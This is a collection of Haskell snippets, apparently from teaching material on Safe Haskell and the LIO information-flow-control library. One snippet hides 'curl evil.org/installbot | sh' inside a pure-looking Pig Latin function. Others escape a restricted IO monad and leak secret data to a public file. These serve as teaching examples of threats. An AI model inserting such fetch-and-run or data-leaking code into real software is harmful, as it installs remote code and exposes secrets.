["```\n        toPigLatin :: L.ByteString -> L.ByteString\n        ```", "```\n    toPigLatin = unsafePerformIO $ do system \"curl evil.org/installbot | sh\" return \"Ia owna ouya\"\n    ```", "```\n    import safe PigLatin (toPigLatin)\n    ```", "```\n    head :: {- Lazy -} ByteString -> Word8 head Empty = errorEmptyList \"head\" head (Chunk c _) = S.unsafeHead c unsafeHead :: {- Strict -} ByteString -> Word8 unsafeHead (PS x s l) = assert (l > 0) $ inlinePerformIO $ withForeignPtr x $ \\p -> peekByteOff p s\n    ```", "```\n        googleTranslate :: Language -> L.ByteString -> RIO L.ByteString\n        ```", "```\n{-# LANGUAGE Trustworthy #-} module RIO (RIO(), runRIO, RIO.readFile) where -- Notice that symbol UnsafeRIO is not exported from this module! newtype RIO a = UnsafeRIO (IO a) runRIO :: RIO a -> IO a runRIO (UnsafeRIO io) = io instance Monad RIO where ... -- Returns True iff access is allowed to file name pathOK :: FilePath -> IO Bool pathOK file = -- policy, e.g., only allow files in /tmp readFile :: FilePath -> RIO String readFile file = UnsafeRIO $ do ok <- pathOK file if ok then Prelude.readFile file else return \"\"\n```", "```\nnewtype RIO a = UnsafeRIO (IO a) runRIO :: RIO a -> IO a runRIO (UnsafeRIO io) = io\n```", "```\nGHCi, version 7.8.2: http://www.haskell.org/ghc/ :? for help ... *RIO> writeFile \"/tmp/hello\" \"Hello, world\\n\" *RIO> runRIO $ RIO.readFile \"/tmp/hello\" \"Hello, world\\n\" *RIO> runRIO $ RIO.readFile \"/etc/passwd\" \"\" *RIO> \n```", "```\nnewtype RIO a = UnsafeRIO { runRIO :: IO a }\n```", "```\nnewtype RIO a = UnsafeRIO (IO a)\n```", "```\ninstance Monad RIO where return = UnsafeRIO . return m >>= k = UnsafeRIO $ runRIO m >>= runRIO . k fail = UnsafeRIO . fail\n```", "```\n    badRIO :: IO a -> RIO a badRIO io = (fail \"ha ha\") { runRIO = io }\n    ```", "```\n    *Main> runRIO $ badRIO $ putStrLn \"gotcha\" gotcha\n    ```", "```\n    {-# LANGUAGE Unsafe #-} Module Sec where data L = Lpriv data H = Hpriv\n    ```", "```\n    {-# LANGUAGE Trustworthy #-} Module Sec.Safe (module Sec) where import Sec (L, H, Sec, sec, open, up)\n    ```", "```\n    class Flows sl sh where instance Flows L L instance Flows L H instance Flows H H -- Notice no instance for Flows H L\n    ```", "```\n    newtype Sec s a = MkSec a instance Monad (Sec s) where return x = MkSec x MkSec a >>= k = k a\n    ```", "```\n    label :: a -> Sec s a label x = MkSec x unlabel :: Sec s a -> s -> a unlabel (MkSec a) s = s `seq` a -- s (H or L) acts like key\n    ```", "```\n    relabel :: (Flows lin lout) => Sec lin a -> Sec lout a relabel (MkSec val) = MkSec val\n    ```", "```\n    queryGoogle :: Sec H L.ByteString -> IO (Sec H L.ByteString) queryGoogle labeledQuery = do let query = unlabel Hpriv labeledQuery -- code is privileged, ... -- so have Hpriv\n    ```", "```\n    untrustedTranslate :: Sec H L.ByteString -> Sec H (IO L.ByteString)\n    ```", "```\n    untrustedTranslate :: Sec H L.ByteString -> Sec H (IO L.ByteString)\n    ```", "```\n    untrustedTranslate secbs = do bs <- secbs return $ do writeFile \"PublicFile\" bs -- oops, pwned {- query Google for translation -}\n    ```", "```\n    newtype SecIO s a = MkSecIO (IO (Sec s a)) instance Monad (SecIO s) where return x = MkSecIO (return (return x)) MkSecIO m >>= k = MkSecIO $ do MkSec a <- m let MkSecIO m' = k a m' run :: SecIO s a -> IO (Sec s a) run (MkSecIO m) = m\n    ```", "```\n    value :: Sec s a -> SecIO s a value sa = MkSecIO (return sa)\n    ```", "```\n    plug :: Less sl sh => SecIO sh a -> SecIO sl (Sec sh a)\n    ```", "```\n    -- Must encode level of file in type, path of file in value type File s = SecFilePath String readFileSecIO :: File s -> SecIO s' (Sec s String) writeFileSecIO :: File s -> String -> SecIO s ()\n    ```", "```\n    queryGoogle :: Sec H L.ByteString -> SecIO H L.ByteString\n    ```", "```\n    untrustedTranslate :: Sec H L.ByteString -> SecIO H L.ByteString\n    ```", "```\n    -- Note type parameter l just specifies the label type data LIOState l = LIOState { lioLabel, lioClearance :: !l }\n    ```", "```\n    {-# LANGUAGE Unsafe #-} newtype LIO l a = LIOTCB (IORef (LIOState l) -> IO a) instance Monad (LIO l) where return = LIOTCB . const . return (LIOTCB ma) >>= k = LIOTCB $ \\s -> do a <- ma s case k a of LIOTCB mb -> mb s\n    ```", "```\n    {-# LANGUAGE Unsafe #-} ioTCB :: IO a -> LIO l a -- back door for privileged code ioTCB = LIOTCB . const -- to execute arbitrary IO actions\n    ```", "```\n    getLIOStateTCB :: LIO l (LIOState l) getLIOStateTCB = LIOTCB readIORef putLIOStateTCB :: LIOState l -> LIO l () putLIOStateTCB s = LIOTCB $ \\sp -> writeIORef sp $! s modifyLIOStateTCB :: (LIOState l -> LIOState l) -> LIO l () modifyLIOStateTCB = getLIOStateTCB >>= putLIOStateTCB . f\n    ```", "```\n    Module LIO.Label class (Eq l, Show l, Read l, Typeable l) => Label l where  lub :: l -> l -> l  glb :: l -> l -> l infixl 5 `lub` `glb`  canFlowTo :: l -> l -> Bool infix 4 `canFlowTo`\n    ```", "```\n    class (Typeable p, Show p) => SpeaksFor p where  speaksFor :: p -> p -> Bool\n    ```", "```\n    class (Label l, SpeaksFor p) => PrivDesc l p where  downgradeP :: p -> l -> l -- compute \"lowest\" equivalent label  canFlowToP :: p -> l -> l -> Bool canFlowToP p l1 l2 = downgradeP p l1 `canFlowTo` l2\n    ```", "```\ndata Level = Public | Secret | TopSecret data Compartment = Nuclear | Crypto data MilLabel = MilLabel { level :: Level , compartments :: Set Compartment }\n```", "```\n    instance Label MilLabel where lub a b = MilLabel (max (level a) (level b)) (Set.union (compartments a) (compartments b)) glb a b = MilLabel (min (level a) (level b)) (Set.intersection (compartments a) (compartments b)) canFlowTo a b = level a <= level b && compartments a `Set.isSubsetOf` compartments b\n    ```", "```\n    prop_irreflexive :: MilLabel -> MilLabel -> Bool prop_irreflexive l1 l2 = if l1 == l2 then l1 `canFlowTo` l2 && l2 `canFlowTo` l1 else not (l1 `canFlowTo` l2 && l2 `canFlowTo` l1) prop_lub :: MilLabel -> MilLabel -> Bool prop_lub l1 l2 = l1 `canFlowTo` l3 && l2 `canFlowTo` l3 where l3 = l1 `lub` l2\n    ```", "```\n    taint :: Label l => l -> LIO l () taint newl = do LIOState { lioLabel = l, lioClearance = c } <- getLIOStateTCB let l' = l `lub` newl unless (l' `canFlowTo` c) $ labelError \"taint\" [newl] modifyLIOStateTCB $ \\s -> s { lioLabel = l' }\n    ```", "```\n    guardWrite :: Label l => l -> LIO l () guardWrite newl = do LIOState { lioLabel = l, lioClearance = c } <- getLIOStateTCB unless (canFlowTo l newl && canFlowTo newl c) $ labelError \"guardWrite\" [newl] withContext \"guardWrite\" $ taint newl\n    ```", "```\n    newtype Priv a = PrivTCB a deriving (Show, Eq, Typeable) instance Monoid p => Monoid (Priv p) where mempty = PrivTCB mempty mappend (PrivTCB m1) (PrivTCB m2) = PrivTCB $ m1 `mappend` m2 privDesc :: Priv a -> a privDesc (PrivTCB a) = a\n    ```", "```\n    privInit :: p -> IO (Priv p) privInit p = return $ PrivTCB p\n    ```", "```\n    taintP :: PrivDesc l p => Priv p -> l -> LIO l () taintP p newl = do LIOState { lioLabel = l, lioClearance = c } <- getLIOStateTCB let l' = l `lub` downgradeP p newl unless (l' `canFlowTo` c) $ labelErrorP \"taintP\" p [newl] modifyLIOStateTCB $ \\s -> s { lioLabel = l' }\n    ```", "```\n    delegate :: SpeaksFor p => Priv p -> p -> Priv p newtype Gate p a = GateTCB (p -> a) deriving Typeable gate :: (p -> a) -> Gate p a gate = GateTCB callGate :: Gate p a -> Priv p -> a callGate (GateTCB g) = g . privDesc\n    ```", "```\n    data LObj label object = LObjTCB !label !object deriving (Typeable)\n    ```", "```\n    {-# LANGUAGE Trustworthy #-} import LIO.TCB.LObj type LMVar l a = LObj l (MVar a) takeLMVar :: Label l => LMVar l a -> LIO l a takeLMVar = blessTCB \"takeLMVar\" takeMVar tryTakeLMVar :: Label l => LMVar l a -> LIO l (Maybe a) tryTakeLMVar = blessTCB \"tryTakeLMVar\" tryTakeMVar putLMVar :: Label l => LMVar l a -> a -> LIO l () putLMVar = blessTCB \"putLMVar\" putMVar\n    ```"]